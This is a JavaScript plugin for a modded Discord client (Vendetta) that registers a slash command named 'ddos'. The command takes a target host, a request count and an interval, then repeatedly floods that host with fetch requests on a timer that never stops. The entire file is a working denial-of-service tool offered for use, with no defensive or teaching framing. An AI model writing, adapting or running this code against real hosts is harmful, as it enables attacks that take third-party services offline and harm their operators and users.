


export default {
		onLoad: function () {
			const { metro, commands, logger } = vendetta;

			const { sendBotMessage: sendEphemeralClydeMessage } =
				metro.findByProps("sendBotMessage");
			const MessageActions = metro.findByProps("sendMessage", "receiveMessage")
			
			


function worker(host, amount, interval) {
  return new Promise(resolve => {
    setInterval(async () => {
      for (let i = 0; i < amount; i++) {
        try {
          await fetch(host);
        } catch (e) {
          console.error(e);
        }
      }
    }, interval);
  });
}




			this.onUnload = commands.registerCommand({
				// execute: exeCute,
				name: "ddos",
				displayName: "ddos",
				description: "ddos call",
				displayDescription: "ddos call",
				options: [
                {
                    name: "host",
                    description: "host or ip",
                    type: 3,
                    required: true,
                    displayName: "host",
                    displayDescription: "host or ip",
                }, {
                    name: "amount",
                    description: "amount req",
                    type: 3,
                    required: true,
                    displayName: "amount",
                    displayDescription: "amount req",
                }, {
                    name: "interval",
                    description: "intervalo da req",
                    type: 3,
                    required: true,
                    displayName: "interval",
                    displayDescription: "intervalo da req",
                }
                 ],
				applicationId: -1,
				inputType: 1,
				type: 1,
				execute: async (args, ctx) => {
        try {
            let host = args.find((sla) => sla.name == "host").value
            let amount = args.find((sla) => sla.name == "amount").value
            let interval = args.find((sla) => sla.name == "interval").value
            
            
            
            sendEphemeralClydeMessage(ctx.channel.id, `iniciando...`)
            await worker(host, amount, interval)
            
        } catch (err) {
            logger.log(err);
            sendEphemeralClydeMessage(ctx.channel.id, "error, look at the debug")
        }
    }
			});
		},
	};
	


